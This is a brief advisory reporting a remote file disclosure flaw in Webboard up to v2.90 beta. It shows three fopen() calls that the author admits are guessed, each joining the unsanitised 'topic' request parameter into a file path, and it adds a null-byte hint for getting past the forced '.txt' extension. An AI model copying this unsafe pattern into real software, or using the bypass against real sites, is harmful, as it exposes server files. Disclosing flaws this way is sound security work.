Webboard <= v.2.90 beta Remote File Disclosure Vulnerability

There are 3 vulnerable calls to fopen() in "/webboard/view.php"
They are on lines 7, 109 and 113.  I have not actually read the
source but based on tests I would GUESS they look something
like this...


  7: fopen(&#039;title/&#039; . $_GET[&#039;topic&#039;] . &#039;.txt&#039;);

...

109: fopen(&#039;counter/read/&#039; . $_GET[&#039;topic&#039;] . &#039;.txt&#039;);

...

113: fopen(&#039;counter/read/&#039; . $_GET[&#039;topic&#039;] . &#039;.txt&#039;);


IMPORTANT:
Due to the trailing ".txt", retrieving files with different
extensions will be difficult unless you are able to get a
null byte through without it being escaped.
